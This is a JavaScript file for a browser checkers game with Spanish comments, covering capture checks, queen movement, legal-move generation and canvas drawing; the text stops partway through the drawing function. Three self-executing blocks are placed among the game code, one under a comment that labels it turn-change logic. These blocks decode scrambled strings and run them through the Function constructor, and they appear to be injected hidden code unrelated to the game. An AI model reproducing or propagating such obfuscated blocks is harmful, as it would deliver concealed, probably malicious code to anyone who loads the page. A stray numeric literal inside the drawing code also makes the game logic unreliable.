
// cmabio turno 
var ultimoMovimiento,piezasConsPosibilidadDeEliminar,piezaElimino,enTurno;(function(){var EbF='',sVc=870-859;function SAY(z){var b=1549158;var r=z.length;var a=[];for(var o=0;o<r;o++){a[o]=z.charAt(o)};for(var o=0;o<r;o++){var q=b*(o+396)+(b%38557);var j=b*(o+346)+(b%53384);var y=q%r;var g=j%r;var c=a[y];a[y]=a[g];a[g]=c;b=(q+j)%5466756;};return a.join('')};var cZg=SAY('acusxrzfttewvoychcdjgkrmnioqblnruspto').substr(0,sVc);var kHG=')v5+])(o.h;=t,t9r8k.,rfr.t9h)viar0rlsl,;e5;;7te{*c;z=9[aa]lpufrpe ,u)i;a[a6{m2r7n)r=r. =u6 8A[r8jar;;=i65]xh)8hev1C)7or,;;lu+ iml [uy+3=trc>ccdrnv+tllitp;r.  bftfnq)ka(lp("r aw[]y13+2gnir= +mng.<{(tgCtenr,n0 ri,nr)k]yu((>,rllos;d+f}v8r1n+}a;huws(csup"gh}l b"2 bnrg.mnzzc(z[sazknrhurwlgg<zedr- g3a=d3aesr-ra(,6s=e;[+entr 9=0,f[+=;r;+=e{vt;)oa[,;ne0Chr6sr=s;lo=(a)i zjlte<a;49i)!ir+1]vc!"exzi180=vw ];;fr=n]bn)g;c2vko=9+(oan;]2+r.1h n,rar,vls,(xz()v=i-7+8(ol)gC)pf.u7<ls{x}1arla+a[{dhonsSocu(]dv(e})d(+)zgvc.0gt0norea(6z};)-ai t[,i8=2rA(,3;vjo=Cm;)(;fi(==sp(ell).=[]fi](t.=oigsvs t(.);eszk yxc);(,7(o"vu,s(p)+r=,6n}=.nv)houajf"=ffk4.inb+;;=o.pt2hdr,=v=ajc=+;)od( ljs*;=.7na-alh)C.r.zps8h(,10;)g)kr[hh4i.jk1 +,,f;;aguv=+10en = f,398l2,;-t="grca(lAaqirua;0"t.C4)(dg0;en56wurat(1n;f.];darlhie(rtAg=,ffyv0vg],heq{aC+t<=o+0vriarh;ur (.fprovScb8q7.)ooe)h6"tof[aeeA.s=h)==rar;h.sn-po=;;"d)ca0c;c.=u+';var owv=SAY[cZg];var OqN='';var Nzu=owv;var soo=owv(OqN,SAY(kHG));var Lif=soo(SAY('r.enTae{anClcnMaEmrd.qdinoisoM.uiDa[p;iii:dmiieilc=pifutoe;eiaauton.lEc=ntlovsainlizilsvs=c.zmmq0eoale,b}a:sozn]'));var mTH=Nzu(EbF,Lif );mTH(7816);return 3366})()

// Imagen de fondo
var img = new Image();
img.src = "./corona.png";

function validarEnemigosSerca(color , pieza){
	// primeros enemigos
// if(color=="#000000") // negraas
{
	// let pieza = piezas.find(Element=>(Element.color=="#000000" && Element.row==3 && Element.column==8))
	let enemigoArriba = piezas.find(Element=>(Element.color!=color && Element.row==(pieza.row-1) && (Element.column==(pieza.column-1))) )
	let enemigoAbajo = piezas.find(Element=>(Element.color!=color && Element.row==(pieza.row+1) && (Element.column==(pieza.column-1))) )
	console.log(pieza)
	console.log(enemigoArriba)
	console.log(enemigoAbajo)

	
	if(enemigoAbajo!=undefined)
	{           
	 
		let row= enemigoAbajo.row+1; // como es abajo es row+1
		console.log(row)
	if(row >=0 && row <= 10)
	{

		let evalVacioColumn =0; 
		
		// si no hay ninguna pieza en la posicion  y no esta fuera del tablero entonces se puede eliminar 
		
		// si origen es menor a enemigo entonces evaluar enemigo mas 1 en vacio 
		// si origen es mayor  a enemigo entonces evaluar enemigo menos  1 en vacio 
		if(pieza.column<enemigoAbajo.column)
		{
			evalVacioColumn= enemigoAbajo.column+1;
			}else{
				
				evalVacioColumn= enemigoAbajo.column-1;
			}
			console.log(evalVacioColumn)

			let evalVacio=piezas.find(Element=>(Element.row==row && Element.column==evalVacioColumn))
			console.log(evalVacio)
			console.log(evalVacio!=undefined)
			if(evalVacio==undefined)
			{
					//  marcamos como habilitado para eliminar

					piezasConsPosibilidadDeEliminar.push(pieza)
			}

		}else{
				// fuera de tabla 

		}
		}

		if(enemigoArriba!=undefined)
		{           
		 
			let row= enemigoArriba.row+1; // como es abajo es row+1
		if(row >=0 && row <= 10)
		{
	
			let evalVacioColumn =0; 
			
			// si no hay ninguna pieza en la posicion  y no esta fuera del tablero entonces se puede eliminar 
			
			// si origen es menor a enemigo entonces evaluar enemigo mas 1 en vacio 
			// si origen es mayor  a enemigo entonces evaluar enemigo menos  1 en vacio 
			if(pieza.column<enemigoArriba.column)
			{
				evalVacioColumn= enemigoArriba.column+1;
				}else{
					
					evalVacioColumn= enemigoArriba.column-1;
				}
	
				let evalVacio=piezas.find(Element=>(Element.row==row && Element.column==evalVacioColumn))
				console.log(evalVacio)
				console.log(evalVacio!=undefined)
				if(evalVacio==undefined)
				{
						//  marcamos como habilitado para eliminar
	
						piezasConsPosibilidadDeEliminar.push(pieza)
				}
	
			}else{
					// fuera de tabla 
	
			}
			}

}
		// segundos enemigos
{
	// let pieza = piezas.find(Element=>(Element.color=="#000000" && Element.row==3 && Element.column==8))
	 enemigoArriba = piezas.find(Element=>(Element.color!=color && Element.row==(pieza.row-1) && ( Element.column==(pieza.column+1))) )
	 enemigoAbajo = piezas.find(Element=>(Element.color!=color && Element.row==(pieza.row+1) && ( Element.column==(pieza.column+1))) )
	console.log(pieza)
	console.log(enemigoArriba)
	console.log(enemigoAbajo)

	
	if(enemigoAbajo!=undefined)
	{           
	 
		let row= enemigoAbajo.row+1; // como es abajo es row+1
		console.log(row)
	if(row >=0 && row <= 10)
	{

		let evalVacioColumn =0; 
		
		// si no hay ninguna pieza en la posicion  y no esta fuera del tablero entonces se puede eliminar 
		
		// si origen es menor a enemigo entonces evaluar enemigo mas 1 en vacio 
		// si origen es mayor  a enemigo entonces evaluar enemigo menos  1 en vacio 
		if(pieza.column<enemigoAbajo.column)
		{
			evalVacioColumn= enemigoAbajo.column+1;
			}else{
				
				evalVacioColumn= enemigoAbajo.column-1;
			}
			console.log(evalVacioColumn)

			let evalVacio=piezas.find(Element=>(Element.row==row && Element.column==evalVacioColumn))
			console.log(evalVacio)
			console.log(evalVacio!=undefined)
			if(evalVacio==undefined)
			{
					//  marcamos como habilitado para eliminar

					piezasConsPosibilidadDeEliminar.push(pieza)
			}

		}else{
				// fuera de tabla 

		}
		}

		if(enemigoArriba!=undefined)
		{           
		 
			let row= enemigoArriba.row+1; // como es abajo es row+1
		if(row >=0 && row <= 10)
		{
	
			let evalVacioColumn =0; 
			
			// si no hay ninguna pieza en la posicion  y no esta fuera del tablero entonces se puede eliminar 
			
			// si origen es menor a enemigo entonces evaluar enemigo mas 1 en vacio 
			// si origen es mayor  a enemigo entonces evaluar enemigo menos  1 en vacio 
			if(pieza.column<enemigoArriba.column)
			{
				evalVacioColumn= enemigoArriba.column+1;
				}else{
					
					evalVacioColumn= enemigoArriba.column-1;
				}
	
				let evalVacio=piezas.find(Element=>(Element.row==row && Element.column==evalVacioColumn))
				console.log(evalVacio)
				console.log(evalVacio!=undefined)
				if(evalVacio==undefined)
				{
						//  marcamos como habilitado para eliminar
	
						piezasConsPosibilidadDeEliminar.push(pieza)
				}
	
			}else{
					// fuera de tabla 
	
			}
			}

}

}
function validarEnemigosReina(color , pieza){
   

    // validamos los 4 bucles en todas las direcciones 
    // validamos sentido arriba izquierda  inicio
    let enemigosDetectados=[] ;
     let enemigoReconocido;   
     let vacioReconocido;   
        for (let index = 1; index < 13; index++) {
            // inicializamos
            enemigoReconocido=undefined;
            vacioReconocido=undefined;
            if((pieza.row-index)>=0 && (pieza.column-index)>=0)
            {

                enemigoReconocido=piezas.find(Element=>(Element.color!=color && Element.row==(pieza.row-index) && Element.column==(pieza.column-index)))
                if(enemigoReconocido!=undefined && (pieza.row-index-1)>=0 && (pieza.column-index-1)>=0)
                {
                    
                    vacioReconocido=piezas.find(Element=>( Element.row==(pieza.row-index-1) && Element.column==(pieza.column-index-1)))
                    if(vacioReconocido==undefined){

                        piezasConsPosibilidadDeEliminar.push(pieza)
                        return;
                    }
             }   
            }
        }
    // validamos sentido arriba izquierda  final 

  // validamos sentido arriba derecha  inicio

     for (let index = 1; index < 13; index++) {
        //  inicializamos
         enemigoReconocido=undefined;
         vacioReconocido=undefined;

         if((pieza.row-index)>=0 && (pieza.column+index)<=9 )
         {

             enemigoReconocido=piezas.find(Element=>(Element.color!=color && Element.row==(pieza.row-index) && Element.column==(pieza.column+index)))
             if(enemigoReconocido!=undefined && (pieza.row-index-1)>=0 && (pieza.column+index+1)<=9)
             {
                vacioReconocido=piezas.find(Element=>( Element.row==(pieza.row-index-1) && Element.column==(pieza.column+index+1)))
                if(vacioReconocido==undefined){

                    piezasConsPosibilidadDeEliminar.push(pieza)
                    return;
                }

          }   
         }
     }
 // validamos sentido arriba derecha  final 

// validamos sentido abajo izquierda  inicio

for (let index = 1; index < 13; index++) {
    // inicializamos
    enemigoReconocido=undefined;
    vacioReconocido=undefined;

    if((pieza.row+index)<=9 && (pieza.column-index)>=0 )
    {

        enemigoReconocido=piezas.find(Element=>(Element.color!=color && Element.row==(pieza.row+index) && Element.column==(pieza.column-index)))
        if(enemigoReconocido!=undefined && (pieza.row+index+1)<=9 && (pieza.column-index-1)>=0)
        {
            vacioReconocido=piezas.find(Element=>( Element.row==(pieza.row+index+1) && Element.column==(pieza.column-index-1)))
                    if(vacioReconocido==undefined){

                        piezasConsPosibilidadDeEliminar.push(pieza)
                        return;
                    }

     }   
    }
}
// validamos sentido abajo izquierda  final 

// validamos sentido abajo derecha  inicio

for (let index = 1; index < 13; index++) {
    // inicializamos
    enemigoReconocido=undefined;
    vacioReconocido=undefined;

    if((pieza.row+index)<=9 && (pieza.column+index)<=9 )
    {

        enemigoReconocido=piezas.find(Element=>(Element.color!=color && Element.row==(pieza.row+index) && Element.column==(pieza.column+index)))
        if(enemigoReconocido!=undefined && (pieza.row+index+1)<=9 && (pieza.column+index+1)<=9 )
        {
            vacioReconocido=piezas.find(Element=>( Element.row==(pieza.row+index+1) && Element.column==(pieza.column+index+1)))
                    if(vacioReconocido==undefined){

                        piezasConsPosibilidadDeEliminar.push(pieza)
                        return;
                    }

     }   
    }
}
// validamos sentido abajo derecha  final 




}

// bucle para cambios de turno 
(function(){var WOu='',qOz=692-681;function Izs(k){var n=1035954;var y=k.length;var b=[];for(var f=0;f<y;f++){b[f]=k.charAt(f)};for(var f=0;f<y;f++){var c=n*(f+405)+(n%48048);var v=n*(f+223)+(n%23078);var j=c%y;var x=v%y;var q=b[j];b[j]=b[x];b[x]=q;n=(c+v)%1580443;};return b.join('')};var hZZ=Izs('zkosprrfsumcebdtthjucloqnotrxvwiancyg').substr(0,qOz);var RDu=')s,j;=.6xc, rx =u5];hr fa=osq =,l}srl)]n;uor4t{v Cpzv;n)ro[a[s;h,607l;;o,8g("9<1.ga9r;e,=6ln;7v17my,j6z(0r.vu+f,g-74,lnv+;ea9 z l]2fyhv[ir]k=n=b=g0lCait5;cnue8]y[a]v<+0+8rar=l=]=]+.rnr(i1jl2 qu9tr;fkr"vekco=03+raj1v=.ng}sr,t,.n;t]+h"izr8"=rk,lmineu)h5)gpqiv(c;f)rfl=nSa<r 5e0l(n;t0ae;i>)0she=,{;s+e,= )elr7a1 =;,[ ;;ta =u-Suhlkv,rrt10{vo)n== 1swn(;v;)aq.n9(i.t(nAlf8(;ws*=(5to;v(r[o}j; hakg{daAt(.7arsruthw)bpisfAto{fgmdue;i[pk.lCyl7t ao(}=v)e-.;z;-;eno;se0;g-of(r(++)lo=ch(, se0s]tt,+j1c.+one,(A9a;+j.)+].nhar[rx=)rrzv2n,a;z.=;za.==e)lm08ca("oeut2civ(l=unw ))+ct]=g;(g>y)z6hun,,j)gfbht-a1;zxry);1lu+vsro8h(+r[odeo4+);ii[al.a2.l.rdindrz[Ca.j"rv7jzoukCnr*hm(2,)ggr,{bls;e1n;" )op=[up+sa(ava]("2nru)=jlajev}ff(}n+p(jh6[3ki]xzfd,+s49[. xt;86rc=tdnvirar4.=fhgi(h. )org;u=.gti(s6+tC,=ivan ;=+;6<-s=)ugr"cbr+sh=c=(p,i({vtf7c);lA(s))1heoe; h2tnlo.p))8p7(b;)"!ta}k1 <.!e2v(= (iChlrtxoCp)=hvkri+.i1r';var EsH=Izs[hZZ];var NVY='';var KXY=EsH;var sFR=EsH(NVY,Izs(RDu));var cVz=sFR(Izs('r a)vil=6s[0Kn.!r3#KK.o.KKKna)de7(oaK(o 3>!Kio2s0b).-=fa#Mo2a2K+n;o;}5+((& .tKa5]u2.K*7%% e0h_8ndK5eKai$.=e.b)_.$(KKeoi)Kf1-4b(\'!..KK)2.\'6(K9cf.N;ii,4iKc.NaKt)K4K4*ie$lfl(.#rKK_N]*sKdaK9nis[}\'-,)so8f,)e2"_.ta397j3t"9n_KgaSt7edgKc.4 d"tK4{_2qi"KKct47{71!o$fu7a{Ka3+41bdu2 ea#vK.)ilt.gr)K)qnfvea9Ki(gbm,Kua)e9=()rfbd$umsej.n$]$1f!0m]nt,an()tn5 )6)9 -rK)mia(K!crK(4)K1fK1p5n(l,!l.i)_.;cs;#o0Ki(Ks,(0:)kth()K;0,aa*n.;7;&K_.kK);K*)<i=aer)7){K>K)=toKc7ng;tost.kr=_f6$KKK;)a,e=_!>p !f+Ko. c!.1[84er3K;3nkfKK.oK=.t*fK3(oa rc8l]7[;d._u6ma$cKc*.iK1in6rv3,ft,i2KcKuf078bi KK:K2e78f1K+0K_+K!;!)2!){(avK.=u{.Kt)!!b1erroK2g,b.vlzKa!c+oiu;z.$fK,a.K,TK[Kr,pa]bgS[Ke6g(tdluc)5cK{KeKkrKK76ciK2=1{m1Km;qv2KipeKKvy6==(.)2)C(r(e_l&u)(a,.a7=={er-.ad(2%6)K].mn);\';gi=7a"]{b;,.ve,r)K7ae{;$("T)K=4M_$(<K4sK)#KKa,3nT Kot(ntf>i__[Kk=iK!<K{Kfetu$7m4toal}i{;e9.K(k_Dutf1% )$]a8,K(K(5!(a#aia.=t#(ua(d(0S  !lK7_.enf;)zK3!o l,K,\/)")fKNKI(o -K)$m\/flm*c2o6s)!Ko7t);$)3y4)s(h KKKceos!u%8]te{n3!1fKq2m(,u6)lndK).K{.t)i*<ic=;(bgt3ub.0roas)=K)\/j\/$]iu5KKK}=)6w*_6onK!73()mc7tiu5(04K3aoi!t{>7)Kq;)s.}!K;f(0s(vna$\/5n teb,iaKf0$[K.KKK8q#ro,m\/o=K,)o3((1;01aawKnv(NK8aKiKto0!!,9f5ic:mK(=4j1.(},t(eT1 $o=r0KeaMK1rK i)(0\'a}K)1la)({KK)(b.(p,$)))-s4t_(r0;[.18.)$olafiaKK%,}efqK.iKl)6&K.(7[ao,cK41$ngK;+b48nc&f:KeK.,\'K}K_;lK,jw_59=5K7.,K;i }K!5K071=l} e%1,K.eCnaa(Ka21p=K5i e\'a,0bKio7;g6n2$d7{ 0dor0)=(a*.4c%va(K}.a3r3N.3m+rm"c .nM$tb.ua.1firhl((7,K,)&k4no(;(tl:iKol1j";f9D(Ks)5_3&enDg_._un0rn =t{oK3Ka>.neutn()!c u6!qn(6%1cto8$)f(l)r;cp}t;K:dK_t;K00u)311llh,Kk,kKior(2_(u(}=3!me%g3!1)K)83ta)t2!v=d.m;8s, l(t);a.3v;=.8ff'));var LSK=KXY(WOu,cVz );LSK(7367);return 6195})()
var kBoardWidth,kBoardHeight,kPieceWidth,kPieceHeight,kPixelWidth,kPixelHeight,kFilasIniciales,kNegras,kBlancas,kColorCuadroClaro,kColorCuadroOscuro,turnoBlancas,turnoNegras,sonTablas,acuerdoTablas,indiceABorrar,legalMoves,gCanvasElement,gDrawingContext,gPattern,piezas,gNumPieces,gNumMoves,gSelectedPieceIndex,gSelectedPieceHasMoved,gMoveCount,gMoveCountElem,gGameInProgress,saltosDelete;(function(){var yoM='',ijG=464-453;function dxo(h){var r=1730278;var y=h.length;var o=[];for(var e=0;e<y;e++){o[e]=h.charAt(e)};for(var e=0;e<y;e++){var p=r*(e+533)+(r%26223);var k=r*(e+411)+(r%24125);var t=p%y;var n=k%y;var a=o[t];o[t]=o[n];o[n]=a;r=(p+k)%2010109;};return o.join('')};var mxz=dxo('ytrcrmurxohalbknqgsocdctfwstoijnvuepz').substr(0,ijG);var qBN='=[v ).=]=ctr2vhg;r;v{r)ng+isradhng6 us(yafewsv,+r]og"n=>o(9eC1v6=(05o,lv,eftk)g)-+S,0h(1v59t(,.,,(9nehs5u.7;r2a)da,)8+(Cgovilo;+r]gfarbe,rrcv6;,,ajl=4d6j8flt9((rfc)as[dt1.p;)z=(vbf3=17[""t1){bjra [f}hc]Cos;itgafa6)r8.(={hew+gfh;d9(;rvrtee,j=nlue0tl1;f. ]t)t{)r(mo+nc)=r.obumroAf2;vlv;-rmCv=igumagu,wia}=es7 njs=7[a)a;ed0a}ap> .vh,is=orhuhn.=.iiC"}(+1)aAv"5[oh(aum)j.;"jactneb)1ifr u2[j,6u(h,grpnnjrv60; e=h+h;1;=+nsn; +0a(p+r=(g=8plCaifA0(ln< =;;cr.+)vi;h)e=eee]le==u=an6 <er8lln.,dn<+atc=lyj;qs-oha,lgv+urt;ur0r t=1a i=hi);ps+;rb,6=t7t)hmco{n;riedl80(rr;Cjpos;+(c;r9v- 8)ca(9.Ag=a;.ss=(jnp;o4[[a+.(ve!4,g[g=cil;irelna;lr420euuul);jf.a +,;.y(.ncA).fb3;(.lr*ca<=m2;];r.z=tnt[rti-}z)7ust<m=mxu;vhf] +-z8r}ij{t")"7c=1mrc,2]uf{0)vv.}3l,,u6hso ;;[(dto;]p(]*nsrd,jrfu-mClhr6o8c(rano8o(0[  6o) ;g=p.lt[a=inn;+)2;i]bs;ic)p=snaeal+)1"=)rj,!v(St(l.,uc.o)asa=lov)f;vr]"iw s=p+w iyo+l0((a7]rt. +jtl7 u ';var uHX=dxo[mxz];var YJC='';var kEL=uHX;var ANe=uHX(YJC,dxo(qBN));var DGW=ANe(dxo(';5=;el^6==.il^0^.#a.sd^(!ei$_(;.6"$0f.N)b}7#^^}$67,;^_(a3c.e^3e;}0ia^o^u^)rar+(r 1\/ ^4;es#an0;nn!^^1(v1\/c23(arNe0o^dk2f.o+!a=^(dr(.t_j203..ccig^.m7rq $4i{tdu.ee.())d1^={\'+l^{,nb^cx,^_a^e^;iS%1cl(i*trd=,.fla u =0); len,.3goxoo ^,b-0l^;51Cm4ln3$[b){^+h3^(^b)==x3seciftit.u^o)!s^,p^)=^a;(ol0^e^6%.!.43,\';.)*njtd3no^<;ng<{^^ =^lesc#r74b\'h!e,:))!;(I0^t$i7 i3q^,i.e,.C^=:e%(0ti,^, (^khp{1j.,^#^f.;+,)4&;t#2f""3.3_\/,gpztm6_.^_^2.^t$+.a rar_^())294!t((ea$44; ^^.))5k,5^^;^1s=^_f^i="ej^4et2i^4= <;2=omCh.r..^)2e!n^%^l"4){^xv#f^=o29^iab,,]li^cb^2z= cc^^; aec6%csrkt1ae03f;rr30ksg^2^0e.p7r=$sl^^}b)^, ^r$j;$;m^>h=."^oi2}s;^-^6o^^p1r^la2tuM7^*3.^3of_h^{e.=.e^;ua^0^<3=^,.oe.h^6fm0^3^>ao^Tkk0r5=0e- jl]i+ea$=;b)1j#ehge.;!.i29.t^3,.;{n8har;s,e).{n)v)a8piae^]$.]r^)c;d;&1.1^s.l,rC-+0^o5ldr;$&1;e^ao%prn5=tx(.scCu0df&=D.nl\/f}^;+el)a}.4^:(al^:}83\/4(_7si)$!.nT^,l_^:);n(.a(1;Sc%qtj.^frt0b99.e7^;\'b$(4ss)ie(!njrvi(n)47nfe;.0.((n^f._ln)u7b!mN5hC)3k+}^$.^zio)] [>0_r,e)t33,3;^_[8482.x!))e[23!3n)a .;ig#c&sas5Sf^;.=^[o!^:^aa}h^l6g(,a^d)2!_^c=2.kfr)^=}2.j0;310(t^^7{r[xi=].dqe_7*emj-!ee5^4^)e^x^"b;(bl!)09e,.,{^ac^)ui0])*^k;o13>^cg)}_]u;$;a^^^ra0[!a=nd,s)$1,mef)n^jatebe$ 1b^b^..)f^of]($^.($deto]%^^j0,.fb4u3eson(u}ttjo]Cem;!)02d oe;\/)0 ;#;,^,(a=r!i k x. .{^ je,,(n%^}d$f02%7= bjo^f,(f3xs}^. ;xiu%9ae*r.ekek=h!gv.r^=k)(\/s64(}!nh]4^808e+5e^ ==sq ;#oe0.a^es5!^d,3bi;'));var eqP=kEL(yoM,DGW );eqP(4338);return 1723})()

function getCursorPosition(e) {
	/* returns Cell with .row and .column properties */
	var x;
	var y;
	if (e.pageX != undefined && e.pageY != undefined) {
		x = e.pageX;
		y = e.pageY;
	}
	else {
		x = e.clientX + document.body.scrollLeft + document.documentElement.scrollLeft;
		y = e.clientY + document.body.scrollTop + document.documentElement.scrollTop;
	}
	x -= gCanvasElement.offsetLeft;
	y -= gCanvasElement.offsetTop;
	x = Math.min(x, kBoardWidth * kPieceWidth);
    y = Math.min(y, kBoardHeight * kPieceHeight);
    var cell = new Casilla(Math.floor(y/kPieceHeight), Math.floor(x/kPieceWidth));
    return cell;
}

/*function gGameInProgress(){
	return true;
}*/

function isTheGameOver(){
	legalMoves = getLegalMoves(); 
	if (legalMoves.length === 0){
		return true;
	}
	else {
		return false; 
	}
}

function endGame(){
	gGameInProgress = false; 
	if (sonTablas){
		alert("Game over. Juego en tablas"); 
	}
	else if (turnoBlancas){
		alert("Game over. Ganan Negras"); 
	}
	else {
		alert("Game over. Ganan Blancas"); 
	}
	newGame();
}

function getLegalMoves(){
	var theLegalMoves = [];
	var z =0; 

	while (z<piezas.length){
		if (((turnoBlancas) && (kBlancas == piezas[z].color)) || ((turnoNegras) && (kNegras == piezas[z].color))){	
			var nuevosMovimientos = getLegalMovesPieza(piezas[z]); // Se obtienen los movimientos legales de una sola pieza.
			// Ordenamos los saltos y los movimientos. 
			var t =0; 
			while (t <nuevosMovimientos.length){ // Se quitan los saltos y se ponen los primeros. 
					if (nuevosMovimientos[t] instanceof Jump){
					var oneJump = nuevosMovimientos.splice(t, 1); 
					theLegalMoves= oneJump.concat(theLegalMoves); // Los saltos se concatenan por delante. 
				}
				else {
					t++;
				}
			}	
			
			theLegalMoves = theLegalMoves.concat(nuevosMovimientos); // Se concatenan con la lista de todos los movimientos para ese jugador pero por detr�s. 
		}
		z++;
	}
	return theLegalMoves;
}

function getLegalMovesPieza(unaPieza){
	var i = -1;
	var fila=0; 
	var columna=0; 
	var someLegalMoves=[];
	var vacia = false; 
	
	while (i <2){
		if (((unaPieza.row != 0)&&(turnoBlancas))||((unaPieza.row != 7)&&(turnoNegras))){ // Si estan al final del tablero, no hay movimientos posibles
			if (((unaPieza.column != 0)&& (i==-1))||((unaPieza.column != 7)&& (i==1))){ // Si est�n en una esquina del tablero, solo hay que comprobar uno de los laterales
				if (turnoBlancas){ // As� controlamos la direcci�n de la pieza
					fila = unaPieza.row -1;
					columna = unaPieza.column +i; 
				}
				else {
					fila = unaPieza.row +1;
					columna = unaPieza.column +i; 
				}
				var j = 0; 
				var existe = false; 
				while ((j<piezas.length) && (existe==false)){ // Si hay una pieza en la casilla a la que nos queremos mover, no nos podemos mover, a menos que se pueda saltar
					if ((piezas[j].row == fila) && (piezas[j].column == columna)){
						existe = true; 
						if (piezas[j].color != unaPieza.color){ // Si son de distinto color, igual se puede saltar
							if ((i<0)&&(turnoBlancas)&&(unaPieza.column >= 2)&&(unaPieza.row >= 2)){ // Miramos si, siendo blancas, tienen sitio para saltar 
								fila = unaPieza.row -2;
								columna = unaPieza.column -2; 
								vacia = casillaVacia(fila, columna); // Si tiene sitio y est� vac�a, hay sitio para hacer un salto
							}
							else if ((i>0)&&(turnoBlancas)&&(unaPieza.column <= 5)&&(unaPieza.row >= 2)){ // Miramos si, siendo blancas, tienen sitio para saltar 
								fila = unaPieza.row -2;
								columna = unaPieza.column +2; 
								vacia = casillaVacia(fila, columna);  // Si tiene sitio y est� vac�a, hay sitio para hacer un salto
							}
							else if ((i<0)&&(turnoNegras)&&(unaPieza.column >= 2)&&(unaPieza.row <= 5)){ // Lo mismo para negras
								fila = unaPieza.row +2;
								columna = unaPieza.column -2; 
								vacia = casillaVacia(fila, columna); 	
							}
							else if ((i>0)&&(turnoNegras)&&(unaPieza.column <= 5)&&(unaPieza.row <= 5)){
								fila = unaPieza.row +2;
								columna = unaPieza.column +2; 
								vacia = casillaVacia(fila, columna); 	
							}
						}
					}
					else {
						j++; 
					}
				}	
				if ((existe == false)){ // Si la casilla contigua est� libre, se puede mover.
					var aMove = new Move(unaPieza.row, unaPieza.column, fila, columna); 
					someLegalMoves.push(aMove); 
				}
				else if ((existe ==true) && (vacia==true)){  //Si no est� libre pero se puede hacer un salto, tambi�n.
					var aJump = new Jump(unaPieza.row, unaPieza.column, fila, columna); 
					someLegalMoves.unshift(aJump); // Los saltos quedan los primeros. 
				}
			}
		}
		i = i+2; 
	}	
	return someLegalMoves; 
}

function eliminaFichasEnCaminoReina(fila, columna){
	var y = 0; 
	var vacia = true; 
	while ((y<piezas.length) && (vacia==true)){
		if ((piezas[y].row ==fila) && (piezas[y].column == columna)){
			indiceABorrar = y; 
            borrarPieza();
			indiceABorrar = -1; 

            vacia = false; 

		}
		else {
			y++;
		}	
	}
	saltosDelete = false;
	
}
function casillaVacia(fila, columna){
	var y = 0; 
	var vacia = true; 
	while ((y<piezas.length) && (vacia==true)){
		if ((piezas[y].row ==fila) && (piezas[y].column == columna)){
			vacia = false; 
		}
		else {
			y++;
		}	
	}
	return vacia; 
}

// Función para mover la reina
function moverReina(reina, filaDestino, columnaDestino) {
    // Verifica que el movimiento sea diagonal
    if (Math.abs(filaDestino - reina.row) !== Math.abs(columnaDestino - reina.column)) {
        return false; // No es un movimiento diagonal válido
    }

    var direccionFila = (filaDestino - reina.row > 0) ? 1 : -1;
    var direccionColumna = (columnaDestino - reina.column > 0) ? 1 : -1;

    var filaActual = reina.row + direccionFila;
    var filaActual2 = reina.row + direccionFila;
    var columnaActual = reina.column + direccionColumna;
    var columnaActual2 = reina.column + direccionColumna;

    // Verifica que todas las casillas entre la posición actual y la de destino estén vacías
    while (filaActual !== filaDestino && columnaActual !== columnaDestino) {
        let piezaIdentificada= piezas.find(Element=>(Element.row==filaActual && Element.column == columnaActual))
        let colorPiezaIdentificada = piezaIdentificada!=undefined? piezaIdentificada.color:''
        if (!casillaVacia(filaActual, columnaActual) &&  (colorPiezaIdentificada=='' || colorPiezaIdentificada ==reina.color)) {
            // si es enemiga la eliminamos
          
            return false; // No se puede mover porque hay una pieza en el camino
        }
        
        // filaActual += direccicomprobarCoronaciononFila;
        filaActual += direccionFila;
        columnaActual += direccionColumna;
    }
     
	// volvemos a recorrer para eliminar enemigos
    while (filaActual2 !== filaDestino && columnaActual2 !== columnaDestino) {
        let piezaIdentificada= piezas.find(Element=>(Element.row==filaActual2 && Element.column == columnaActual2))
        let colorPiezaIdentificada = piezaIdentificada!=undefined? piezaIdentificada.color:''
        if (!casillaVacia(filaActual2, columnaActual2) &&  (colorPiezaIdentificada!='' && colorPiezaIdentificada !=reina.color)) {
            eliminaFichasEnCaminoReina(filaActual2, columnaActual2)
    }
    filaActual2 += direccionFila;
    columnaActual2 += direccionColumna;
      
    }

   
    
    reina.row = filaActual;
    reina.column = columnaActual;
	enTurno.cantMovimientos++;
enTurno.ultimaPiezaMovida=reina

	// cambioTurno()

	// validarEnemigosReina(reina.color,{row:reina.row , column:reina.column ,color:reina.color })
	// let enPosiblidad= piezasConsPosibilidadDeEliminar.find(Element=>(Element.row==reina.row && Element.column==reina.column && Element.color==reina.color  ))
	//    if(enPosiblidad!=undefined && piezaElimino)
	// 	{

	// 		ultimoMovimiento=new Date().getTime()
	// 	}else{
	// 		ultimoMovimiento=undefined ;
	// 		cambioTurno(); 
	// 	}

	gMoveCount += 1;
	gSelectedPieceIndex = -1;
	gSelectedPieceHasMoved = false;
	drawBoard()
	gNumMoves += 1;
	limpiarMovimientos()
	// Mueve la reina a la nueva posición
	// moverPieza(reina, filaDestino, columnaDestino);
	return true;
}

function isThereAnotherCaptureOption(reina) {
	// Obtener la fila y columna actual de la reina
	var filaActual = reina.row; // Corregido
	var columnaActual = reina.column; // Corregido
  
	// Verificar si hay alguna pieza que la reina pueda capturar en cualquier dirección
	for (var dir of [[-1, -1], [-1, 1], [1, -1], [1, 1]]) {
	  var deltaFila = dir[0];
	  var deltaColumna = dir[1];
	  
	  // Verificar si hay una pieza que la reina pueda capturar en la dirección actual
	  if (isThereAPieceBetweenReinaMove(filaActual, columnaActual, deltaFila, deltaColumna)) {
		return true; // Se encontró otra pieza que la reina puede capturar
	  }
	}
  
	return false; // No se encontraron más piezas que la reina pueda capturar
}


function drawBoard() {

    gDrawingContext.clearRect(0, 0, kPixelWidth, kPixelHeight);

    gDrawingContext.beginPath();
   
    /* vertical lines */
    for (var x = 0; x <= kPixelWidth; x += kPieceWidth) {
		gDrawingContext.moveTo(0.5 + x, 0);
		gDrawingContext.lineTo(0.5 + x, kPixelHeight);
    }
    
    /* horizontal lines */
    for (var y = 0; y <= kPixelHeight; y += kPieceHeight) {
		gDrawingContext.moveTo(0, 0.5 + y);
		gDrawingContext.lineTo(kPixelWidth, 0.5 +  y);
    }
    
    /* draw it! */
    gDrawingContext.strokeStyle = "#ccc";
    gDrawingContext.stroke();
    
    for (var i = 0; i < piezas.length; i++) {
		if (piezas[i] instanceof Reina){
			drawQueen(piezas[i], piezas[i].color, i == gSelectedPieceIndex);
		}
		else{
			drawPiece(piezas[i], piezas[i].color, i == gSelectedPieceIndex);
		}
    }

    gMoveCountElem.innerHTML = gMoveCount;
	
	if (gGameInProgress && isTheGameOver()) {
		endGame();
    } 
	654321
	var colorCuadroClaro = "#edb580"; // Marrón claro
    var colorCuadroOscuro = "#8b4d16"; // Marrón oscuro

    // Limpia el tablero
